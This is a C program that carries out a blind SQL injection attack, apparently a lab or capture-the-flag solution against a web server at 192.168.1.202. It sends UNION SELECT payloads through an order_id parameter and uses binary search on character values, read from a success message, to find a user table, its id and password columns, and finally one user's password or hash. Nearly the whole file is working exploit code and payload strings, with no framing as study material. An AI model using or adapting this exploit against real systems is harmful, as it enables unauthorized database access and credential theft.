#define __MY_DEBUG__
#include <limits.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>

#define WEB_ADDR 192, 168, 1, 202

union address {
    uint8_t fields[4];
    uint32_t l;
};

int32_t create_socket() {
    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        #ifdef __MY_DEBUG__
                printf("create socket failed...\n");
        #endif
                close(sockfd);
                exit(0);
    }

    return sockfd;
}

void _listen(const int32_t sockfd) {
    if (listen(sockfd, 5) < 0) {
#ifdef __MY_DEBUG__
        printf("listen failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("bind failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t _accept(const int32_t sockfd) {
    struct sockaddr addr = {0};
    socklen_t addrlen = sizeof(addr);
    int32_t clientfd = accept(sockfd, &addr, &addrlen);
    if (clientfd < 0) {
#ifdef __MY_DEBUG__
        printf("accept failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return clientfd;
}

size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
    ssize_t sz = recv(sockfd, buf, size, 0);
    if (sz < 0) {
#ifdef __MY_DEBUG__
        printf("recv failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return (size_t)sz;
}

FILE *_fopen(const char *restrict path) {
    FILE * file = fopen(path, "w");
    if (file == 0) {
        #ifdef __MY_DEBUG__
                printf("fopen failed...\n");
        #endif
                exit(0);
    }
    return file;
}

size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
    size_t written = fwrite(ptr, size, nitems, stream);

    if (written < nitems) {
        #ifdef __MY_DEBUG__
            printf("fwrite failed...\n");
        #endif
        exit(0);
    }

    return written;
}

void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
             const uint8_t field0, const uint8_t field1,
             const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("sendto failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("connect failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _send(const int32_t client, const void * const data, size_t size) {
    if (0 > send(client, data, size, 0)) {
#ifdef __MY_DEBUG__
        perror("Sending failed...\n");
#endif
        close(client);
        exit(0);
    }
}

bool recv_empty(int32_t sockfd) {
    enum {
        CHUNK = 16
    };
    char * buf = malloc(CHUNK);
    size_t size = 0;
    *buf = 0;
    char *header_end=0;
    size_t recvd;

    while (1) {
        recvd = _recv(sockfd, buf + size, CHUNK - 1);
        if (!recvd) {
            break;
        }

        size += recvd;
        buf = realloc(buf, size+CHUNK);
        buf[size] = 0;

        header_end = strstr(buf, "\r\n\r\n");

        if (header_end) {
            break;
        }
    }
    char Content_Length[] = "Content-Length: ";
    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
    size_t body_left = content_len - body_recvd;
    buf = realloc(buf, body_left+size+1);
    recvd = _recv(sockfd, buf + size, body_left);
    size = size + recvd;

    const char *ptr = strstr(buf, "Your order has been sent!");

    #ifdef __MY_DEBUG__
        //puts(buf);
    #endif

    free(buf);

    return ptr;
}

typedef bool (*check_func_t)(const void *ctx);

typedef struct {
    int sockfd;
    char *discovered;
    int index;
    const char *guess;
} GeneralCtx;

typedef struct {
    GeneralCtx gen_ctx;
    const char *col_to_find;
    const char *table_name;
} ColumnCtx;

typedef struct {
    GeneralCtx gen_ctx;
    const char *table_name;
    const char *id_col;
    const char *pwd_col;
} PwdCtx;

bool check_table(const void *ctx) {
    GeneralCtx *table_ctx = (GeneralCtx *)ctx;

    char mal_req[4096];

    const char *fmt =
        "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20"
        "FROM%%20information_schema.TABLES%%20"
        "WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20"
        "AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20"
        "AND%%20CHAR_LENGTH(table_name)>CHAR_LENGTH(%s)%%20"// %s = discovered (Literal)
        "AND%%20ASCII(SUBSTR(table_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
        "LIMIT%%201;"
        " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    sprintf(mal_req, fmt, table_ctx->discovered, table_ctx->discovered, table_ctx->index + 1, table_ctx->guess);
    _send(table_ctx->sockfd, mal_req, strlen(mal_req));
    return recv_empty(table_ctx->sockfd);
}

bool check_column(const void *ctx) {
    ColumnCtx *c_ctx = (ColumnCtx*)ctx;
    char mal_req[4096];

    const char *fmt =
        "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
        "FROM%%20information_schema.COLUMNS%%20"
        "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name
        "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
        "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
        "AND%%20CHAR_LENGTH(column_name)>CHAR_LENGTH(%s)%%20"
        "AND%%20ASCII(SUBSTR(column_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
        "LIMIT%%201;"
        " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->col_to_find, c_ctx->gen_ctx.discovered, c_ctx->gen_ctx.discovered,
        c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
    _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
    return recv_empty(c_ctx->gen_ctx.sockfd);
}

bool check_password(const void *ctx) {
    PwdCtx *d_ctx = (PwdCtx*)ctx;
    char mal_req[4096];

    const char *fmt =
        "GET /index.php?order_id=0%%20UNION%%20SELECT%%20"
        "%s" // SELECT `pwd_col`
        "%%20FROM%%20"
        "%s%%20" // FROM `table_name`
        "WHERE%%20"
        "%s" // WHERE `id_col`
        "%%3d%%27322695107%%27%%20"
        "AND%%20"
        "%s%%20" // AND `pwd_col`...
        "LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
        "AND%%20ASCII(SUBSTR("
        "%s" // SUBSTR(`pwd_col`...)
        ",%i,1))<%%3dASCII(%%27%s%%27)%%20"
        "LIMIT%%201;"
        " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    sprintf(mal_req, fmt,
        d_ctx->pwd_col,
        d_ctx->table_name,
        d_ctx->id_col,
        d_ctx->pwd_col,
        d_ctx->gen_ctx.discovered,
        d_ctx->pwd_col,
        d_ctx->gen_ctx.index + 1,
        d_ctx->gen_ctx.guess
    );
    _send(d_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
    return recv_empty(d_ctx->gen_ctx.sockfd);
}


const char *url_map[96] = {
    "%20", // 0x20 Space
    "%21", // 0x21 !
    "%22", // 0x22 "
    "%23", // 0x23 #
    "%24", // 0x24 $
    "%25", // 0x25 %
    "%26", // 0x26 &
    "%27", // 0x27 '
    "%28", // 0x28 (
    "%29", // 0x29 )
    "%2A", // 0x2A *
    "%2B", // 0x2B +
    "%2C", // 0x2C ,
    "-",   // 0x2D - (Unreserved)
    ".",   // 0x2E . (Unreserved)
    "%2F", // 0x2F /

    // --- 0x30 to 0x39 (Numbers 0-9 Unreserved) ---
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",

    // --- 0x3A to 0x40 ---
    "%3A", // 0x3A :
    "%3B", // 0x3B ;
    "%3C", // 0x3C <
    "%3D", // 0x3D =
    "%3E", // 0x3E >
    "%3F", // 0x3F ?
    "%40", // 0x40 @

    // --- 0x41 to 0x5A (Uppercase A-Z Unreserved) ---
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",

    // --- 0x5B to 0x60 ---
    "%5B", // 0x5B [
    "%5C", // 0x5C \ (Backslash)
    "%5D", // 0x5D ]
    "%5E", // 0x5E ^
    "%5F", // 0x5F _
    "%60", // 0x60 `

    // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",

    // --- 0x7B to 0x7F ---
    "%7B", // 0x7B {
    "%7C", // 0x7C |
    "%7D", // 0x7D }
    "~",   // 0x7E ~ (Unreserved)
    "%7F"  // 0x7F DEL
};

void binary_search(check_func_t check_fn, void *ctx) {
    GeneralCtx *gen_ctx = (GeneralCtx *)ctx;
#ifdef __MY_DEBUG__
    int count = 0;
#endif

    for (int i = 0; i < 10; i++) {
    #ifdef __MY_DEBUG__
        printf("%i--\n", i);
    #endif
        unsigned char low = 0;
        unsigned char high = 0x5f;
        unsigned char mid;
        while (low < high) {
            mid = (unsigned char)(low + (high - low) / 2);
        #ifdef __MY_DEBUG__
            count++;
        #endif
            gen_ctx->index = i;
            gen_ctx->guess = url_map[mid];
            if (check_fn(ctx)) {
                high=mid;
            } else {
                low=mid + 1;
            }
        #ifdef __MY_DEBUG__
            printf("\t%s,%c,%c\n", gen_ctx->discovered, low + 0x20, high + 0x20);
        #endif
        }
        if (low>0x5e) {
            #ifdef __MY_DEBUG__
                puts("String shorter than max.");
            #endif
            break;
        }
        strcat(gen_ctx->discovered, url_map[low]);
    }
#ifdef __MY_DEBUG__
    printf("number of queries is: %d\n",count);
#endif
}

int32_t main() {
    int32_t sockfd = create_socket();
    _connect(sockfd, WEB_ADDR, 80);


    char table_name[31] = {0};
    {
        GeneralCtx table_ctx = {
            .sockfd = sockfd,
            .discovered = table_name
        };

        binary_search(check_table, &table_ctx);
    }

    #ifdef __MY_DEBUG__
        printf("Found Table: %s\n", table_name);
    #endif

    char id_name[31] = {0};
    {
        ColumnCtx id_ctx = {
            .gen_ctx = {
                .sockfd = sockfd,
                .discovered = id_name
            },
            .table_name = table_name,
            .col_to_find = "id"
        };

        binary_search(check_column, &id_ctx);
    }

    char pwd_name[31] = {0};
    {
        ColumnCtx pwd_col_ctx = {
            .gen_ctx = {
                .sockfd = sockfd,
                .discovered = pwd_name
            },
            .table_name = table_name,
            .col_to_find = "pwd"
        };

        binary_search(check_column, &pwd_col_ctx);
    }

    char final_password[31] = {0};
    {
        PwdCtx pwd_ctx = {
            .gen_ctx = {
                .sockfd = sockfd,
                .discovered = final_password
            },
            .table_name = table_name,
            .id_col = id_name,
            .pwd_col = pwd_name
        };
        binary_search(check_password, &pwd_ctx);
    }

    printf("Found Password/Hash: %s\n", final_password);

    close(sockfd);
}
